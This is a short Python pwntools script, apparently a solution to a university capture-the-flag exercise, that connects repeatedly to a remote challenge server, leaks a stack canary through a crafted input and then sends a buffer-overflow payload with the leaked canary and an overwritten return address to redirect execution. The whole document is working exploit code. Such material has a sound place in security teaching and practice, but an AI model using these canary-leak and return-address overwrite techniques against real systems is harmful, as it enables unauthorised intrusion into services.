from pwn import *

while True:
    io = remote('inf226.puffling.no', 7003)
    
    print(io.recvuntil(b'What is your favourite pancake recipe? (Finish with an empty line)\n1. ')) #

    i = 0x7fffffffec30
    io.sendline(cyclic(32) + p64(i)) 
    maybeCanary = io.recvuntil(b'. ').decode().split('.')[0]
    print(maybeCanary)
    canary = p64(int(maybeCanary, 16))
     
    io.sendline(cyclic(32) + p64(i) + canary + p64(1) + p64(0x4011db))
    io.recvuntil(b'.')
    io.sendline()
    output = str(io.readall(timeout=.5),"ascii")
    print(output)
    io.close()
